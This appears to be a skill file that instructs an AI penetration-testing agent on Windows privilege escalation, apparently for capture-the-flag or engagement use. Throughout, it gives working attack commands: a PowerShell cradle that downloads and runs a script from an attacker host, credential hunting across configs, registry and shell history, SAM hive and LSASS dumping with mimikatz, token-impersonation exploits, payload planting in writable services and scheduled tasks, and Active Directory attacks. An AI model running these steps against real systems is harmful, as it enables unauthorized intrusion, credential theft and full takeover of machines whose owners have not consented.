---
name: windows-privesc
description: Windows privilege escalation — automated enumeration (basic_enum, winPEAS, PrivescCheck) plus a manual checklist and the most common paths to SYSTEM.
allowed-tools: postex__windows_basic_enum shell__tmux_send shell__tmux_read shell__tmux_new_session
---

# Windows privilege escalation

## Order of operations

1. **Automated sweep first — `postex__windows_basic_enum(session_name)`.** One
   call runs identity/privs (`whoami /priv|/groups`), OS + patch level
   (`systeminfo`, `wmic qfe`), installed .NET, users/admins, services +
   paths, scheduled tasks, stored creds (`cmdkey`), AlwaysInstallElevated,
   listening ports, AV product, and ARP. **Read the whole thing before doing
   anything else** — it usually contains the path already.
2. **Pursue an obvious win** from the sweep (privilege-driven paths below).
3. **No obvious path → go deep.** Run an automated deep enumerator (winPEAS /
   PrivescCheck, next section) and/or the manual checklist. Deep enum is the
   Windows analog of `postex__linpeas` for Linux.
4. **Triage candidates by OS build + arch + installed .NET** before fetching a
   privesc binary — see `prebuilt-exploit-binaries`. Pinning the variant first
   is cheaper than fetching the wrong one.

## Automated deep enumeration (winPEAS / PrivescCheck / Seatbelt)

These aren't on the target by default — stage them with `binary-fetch-and-drop`
(Kali fetch session + HTTP server + target-side pull). Pick by what's available:

- **winPEAS** (most thorough; needs a dropped binary):
  ```
  REM x64 box. Capture to a file — winPEAS output is huge; never stream it
  REM straight into the pane and re-read (you'll trip the read/idle guards).
  C:\Windows\Temp\winPEASx64.exe log=C:\Windows\Temp\wp.txt
  REM `cmd fast` skips the slow brute checks; drop `fast` for the full run.
  C:\Windows\Temp\winPEASx64.exe cmd fast log=C:\Windows\Temp\wp.txt
  ```
  Then read it in **scoped chunks**, not one giant dump:
  ```
  findstr /i "interesting password cred privilege unquoted writable" C:\Windows\Temp\wp.txt
  more C:\Windows\Temp\wp.txt
  ```
- **PrivescCheck.ps1** (no binary — pure PowerShell, good when AV eats winPEAS):
  ```
  powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended"
  ```
- **Seatbelt.exe** (.NET; targeted groups): `Seatbelt.exe -group=all` or
  `-group=system`. Same staging + chunked-read discipline as winPEAS.

If winPEAS/PrivescCheck flags a lead you can't pin (which Potato for this build,
which kernel CVE has a working POC), hand back a `research_needed` entry with the
exact OS build + .NET + privileges — don't guess.

## Manual checklist — what `basic_enum` does NOT cover

Run these via `shell__tmux_send` when you need more than the sweep. Scope and
bound them; avoid unbounded recursive `dir /s` from `C:\`.

**Service & scheduled-task ACLs** (stage `accesschk.exe` first):
```
accesschk.exe /accepteula -uwcqv "Users" *          REM services Users can modify
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
accesschk.exe /accepteula -uwdq "C:\Program Files"  REM writable dirs (binary planting)
sc qc <service>                                     REM inspect a specific service
schtasks /query /fo LIST /v | findstr /i "Task To Run Run As User"
```
Without accesschk: `icacls "C:\Path\To\service.exe"` and look for
`(F)`/`(M)`/`(W)` for `Users`/`Everyone`/`Authenticated Users`/your user.

**Credential hunting** (very high yield, especially from a service/IIS account):
```
REM Config files with secrets — scope to likely roots, not C:\
findstr /si "password passwd pwd connectionString" C:\inetpub\*.config C:\xampp\*.ini
dir /s /b C:\inetpub\wwwroot\web.config & type C:\inetpub\wwwroot\web.config
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s          REM saved PuTTY sessions
reg query HKLM /f password /t REG_SZ /s 2>nul                    REM slow; last resort
type C:\Windows\Panther\Unattend.xml 2>nul & type C:\Windows\Panther\Unattend\Unattend.xml 2>nul
dir /s /b C:\*sysprep.inf C:\*sysprep.xml C:\*unattend.xml 2>nul
```
(Domain GPP cpassword: search SYSVOL for `Groups.xml` — see the AD section.)

**System / context** (often decides the technique):
```
set                                                 REM env vars, PATH (DLL-hijack leads)
echo %PATH%                                          REM any writable dir on PATH?
wmic product get name,version                       REM vulnerable installed software
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"   REM autorun binaries
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName  REM exact build
```

**Network / lateral leads**: `net use`, `net share`, `qwinsta` (other logged-on
users), `netstat -ano` (already in the sweep) for loopback-only services to
tunnel.

## Privilege-driven paths

| Privilege / group seen | Path |
|---|---|
| `SeImpersonatePrivilege` / `SeAssignPrimaryToken` | PrintSpoofer / GodPotato / JuicyPotatoNG / SweetPotato — token impersonation to SYSTEM. Pick the variant by OS build + .NET (see `prebuilt-exploit-binaries`). |
| `SeBackupPrivilege` / `Backup Operators` | Read SAM + SYSTEM hives (`reg save hklm\sam`, `reg save hklm\system`), extract creds offline (`hash-cracking`). |
| `SeRestorePrivilege` | Write to protected locations — overwrite a service binary or use a DLL/IFEO hijack. |
| `SeDebugPrivilege` | LSASS access — dump with `mimikatz sekurlsa::logonpasswords` or comsvcs `MiniDump`. |
| `SeTakeOwnershipPrivilege` | Take ownership of a SYSTEM-writable binary, then replace it. |
| `SeLoadDriverPrivilege` | Load a vulnerable signed driver (BYOVD) — advanced. |

`SeImpersonate` is extremely common on service/IIS/MSSQL accounts (the typical
web-shell foothold) and is usually the fastest route to SYSTEM.

## Service / scheduled-task misconfig paths

- **Writable service binary** → drop a payload, `sc stop`/`sc start` (or reboot).
- **Unquoted service path with spaces** → plant `C:\Program.exe` style payload
  in a writable parent (`wmic service get name,pathname` → look for unquoted
  paths not in `"..."`).
- **Weak service ACL** (`SERVICE_CHANGE_CONFIG`) → `sc config <svc> binpath= "..."`.
- **Scheduled task running as SYSTEM** whose script/binary you can modify.

### A task/service runs as a higher-priv user — convert it, don't race it

This is the most-fumbled Windows privesc. The instant the sweep shows a task or
service whose **RunAs** is `Administrator`/`SYSTEM`, do NOT try to watch, poll, or
race the running process. Run this deterministic chain — it's 3-4 cheap commands,
not a polling loop:

1. **Read exactly what it executes.** (The sweep's `Get-ScheduledTask` view has
   the `Action` already; if you need detail or the task is hidden:)
   ```
   schtasks /query /tn "<name>" /xml          REM full definition: Command + Arguments + RunAs
   REM hidden from schtasks? read the on-disk definition directly:
   type "C:\Windows\System32\Tasks\<name>"    REM XML: <Command>, <Arguments>, <Principal>
   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" /s
   ```
   For a service: `sc qc <svc>` (BINARY_PATH_NAME + SERVICE_START_NAME).
2. **Check YOUR write access to what it runs — the file AND its parent dir:**
   ```
   icacls "<the exact Command path it runs>"
   icacls "<the parent directory>"            REM write to the dir = replace the file
   ```
   Look for `(F)`/`(M)`/`(W)`/`(WD)`/`(AD)` for your user, `Users`,
   `Authenticated Users`, or a group you're in.
3. **Decide from write access — this is the whole game:**
   - **You can write the file (or its dir)** → that is the privesc. Overwrite/plant
     your payload, then let the task fire on its schedule (poll for the
     **root-owned** artifact per `privesc-verify` — never `sleep`) or start it
     (`schtasks /run /tn "<name>"`). A higher-priv runner whose target you can
     write **is** root; stop looking.
   - **You can't write it, but you can change what runs** (weak task/service ACL,
     `schtasks /change /tn .. /tr ..`, `sc config .. binpath=`) → repoint it.
   - **You can't write or reconfigure anything** → this vector is closed. Record
     it and hand back `research_needed` naming the task, its Command, and the ACL
     you observed. Do NOT build pollers or try to inject into the live process.

The failure to avoid: finding "task X runs as Administrator" and then spending
dozens of commands polling/racing it. If you never ran step 1-2 (what does it
run, can I write it), you are grinding, not escalating.

## Kernel + missing patches

`wmic qfe get HotFixID,InstalledOn` (in the sweep) → diff against known LPEs for
the exact build. Use Windows-Exploit-Suggester-NG / local exploit-DB to map
patches → exploits. Kernel exploits are last-resort (crash risk) — prefer a
token or misconfig path. A POC that won't compile is a hand-back, not a grind.

## AD-specific (lab / engagement mode)

If `whoami` returns `DOMAIN\user`:
- `nltest /dclist:DOMAIN`, `net group "Domain Admins" /domain`
- GPP cpassword: `findstr /s /i cpassword \\DOMAIN\SYSVOL\DOMAIN\Policies\*.xml`
- Enumerate with SharpHound / PowerView (lab mode only — noisy); common paths:
  kerberoasting, ASREProasting, ACL abuse via BloodHound.

(BloodHound usually justifies the AD specialist subagent.)

## Don't break the shell / output hygiene

- Token-impersonation tools that crash can pull your shell down. Stand up a
  second listener/session before running JuicyPotato-class tools.
- **Capture deep-enum output to a file and read it in scoped chunks**
  (`findstr`, `more`) — don't dump winPEAS into the pane and then re-read it.
  Blind re-reads trip the idle-read guard and bloat context.
- Once you have SYSTEM (or the flag), stop and write the `Finding` — don't keep
  enumerating a box you already own.
